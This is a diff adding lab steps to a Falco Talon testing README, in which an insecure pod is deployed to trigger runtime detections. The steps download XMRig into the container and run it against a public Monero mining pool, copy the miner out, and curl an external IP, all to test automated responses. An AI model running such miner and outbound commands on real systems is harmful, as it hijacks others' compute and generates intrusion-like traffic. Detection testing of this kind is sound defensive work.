@@ -98,3 +98,85 @@ Deploy Talon into the newly created ```falco``` network namespace:
 ```
 helm install falco-talon . -n falco
 ```
+
+## Create an insecure workload
+
+```
+kubectl apply -f https://raw.githubusercontent.com/nigel-falco/falco-talon-testing/main/dodgy-pod.yaml
+```
+In the second window, run:
+```
+kubectl get events -n default
+```
+Back in the first window, run:
+```
+kubectl exec -it dodgy-pod -- bash
+```
+Download the miner from Github
+```
+curl -OL https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz
+```
+Unzip xmrig package:
+```
+tar -xvf xmrig-6.16.4-linux-static-x64.tar.gz
+```
+```
+cd xmrig-6.16.4
+```
+```
+./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u lies@lies.lies -p x -t 2
+```
+
+
+## Testing the Script response action
+
+Copy file from a container and trigger a ```Kubernetes Client Tool Launched in Container``` detection in Falco: <br/>
+https://thomas.labarussias.fr/falco-rules-explorer/?status=enabled&source=syscalls&maturity=all&hash=bc5091ab0698e22b68d788e490e8eb66
+
+```
+kubectl cp dodgy-pod:xmrig-6.16.4-linux-static-x64.tar.gz ~/desktop/xmrig-6.16.4-linux-static-x64.tar.gz
+```
+
+
+## Enforce Network Policy on Suspicious Traffic
+
+```
+kubectl exec -it dodgy-pod -- bash
+```
+
+Installing a suspicious networking tool like telnet
+```
+curl 52.21.188.179
+```
+
+Check to confirm the IP address was blocked:
+```
+kubectl get networkpolicy dodgy-pod -o yaml
+```
+
+```
+kubectl delete networkpolicy dodgy-pod
+```
+
+## Expose the Falcosidekick UI
+```
+kubectl port-forward svc/falco-falcosidekick-ui -n falco 2802 --insecure-skip-tls-verify
+```
+
+Talon can be removed at any time via:
+```
+helm uninstall falco-talon -n falco
+```
+
+Scale down the cluster
+```
+eksctl get nodegroups --cluster falco-cluster
+```
+```
+eksctl scale nodegroup --cluster falco-cluster --name ng-03dfe2da --nodes 0
+```
+
+Kubecolor
+```
+alias kubectl="kubecolor"
+```
